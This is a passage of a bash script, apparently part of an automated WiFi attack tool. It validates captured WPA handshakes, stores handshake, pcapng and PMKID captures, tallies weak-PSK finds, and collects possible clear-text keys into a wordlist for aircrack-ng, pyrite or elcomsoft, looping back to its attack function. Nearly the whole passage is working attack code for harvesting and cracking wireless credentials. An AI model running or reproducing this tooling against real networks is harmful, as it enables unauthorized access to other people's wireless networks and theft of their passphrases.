        ESSIDNAME3=${ESSIDNAME4//-/_}

        ESSIDNAME2=${ESSIDNAME3// /_}

		fi




# Double Testfor handshake as wpaclean can produce false positives

if [ ! -z $ESSIDNAME2 ]; then
	let handcol=$handcol+1
	DATEFILE=_$(date +%y%m%d_%H:%M)
        sleep 1
	chmod 755 /tmp/HANDTEST/$bssid-01.cap 
	cp -f /tmp/HANDTEST/$bssid-01.cap /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2$DATEFILE.cap
	sleep 1
    	echo "[+] A Valid Handshake moved to /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2$DATEFILE.cap"
	sleep 3

	fi
		fi

hcx-air-scan_fn

sleep 2

hcxpsk=

countcsv1=`ls -A /tmp/HANDTEST/*.csv 2>/dev/null | wc -l`

#echo "debug 2307 $countcsv1"

	if [[ $countcsv1 != 0 ]]; then
		
		cp /tmp/HANDTEST/*.csv  /tmp/ESSIDPROBE_DIR/

		fi


	countcsv1=`ls -A /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`


	if [[ $countcsv1 != 0 ]]; then
    
             echo "[+]"
	     echo "[+] Moving any possible WPA keys in clear text to" 
             echo "[+]   /root/PROBEESSID_DATA/essidprobesdic.txt"
	     echo "[+] for use with aircrack-ng,pyrite or elcomsoft."
	     echo "[+]"
	     sleep 3

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

		ESSIDPROBE_fn

			fi

	if [[ $USE_REF == y || $USE_REF == Y ]]; then

		ESSIDREF_fn

			fi


		fi

numi1=$(expr "$numi1" - 1) # loop number of networks in the number of SSID from ssid list

if [[ $numi1 = 0 && $COUNT > 0 ]]; then

	passive_scan

		fi

if [[ $numi1 = 0 && $COUNT = 0 ]]; then

exit_fn # exit

	fi

        HANDSHKACQ=$(ls -A /root/HANDSHAKEHOLD/*.cap 2>/dev/null | wc -l)

		HANDSHKDIF=$(expr "$HANDSHKACQ" - "$HANDSHKSTART")

	PCAPNGACQ=$(ls -A /root/PCAPNGFILES/*.pcapng 2>/dev/null | wc -l)

		PCAPNGDIF=$(expr "$PCAPNGACQ" - "$PCAPNGSTART")

	PMKIDACQ=$(ls -A /root/PMKIDCAP/*PMKID.cap 2>/dev/null | wc -l)

		PMKIDDIF=$(expr "$PMKIDACQ" - "$PMKIDSTART")

	WEAKPSKACQ=$(ls -A /root/HANDSHAKEHOLD/*Weak-PSK-WPA-FOUND.txt 2>/dev/null | wc -l)

		WEAKPSKDIF=$(expr "$WEAKPSKACQ" - "$WEAKPSKSTART")


## Line count on weak candidate removed 
## Add to change weak candidate evey staton check

# Line count handling for weakcandidate dic file advances and resets if completed
		                
#			if [[ $WPADICLC == $WPADICTOT ]]; then

# 				WPADICLC=0
               
#				fi

#               WPADICLC=$(expr "$WPADICLC" + 1)


attack_fn # loop back to function

		fi

}

prepare_fn
#done
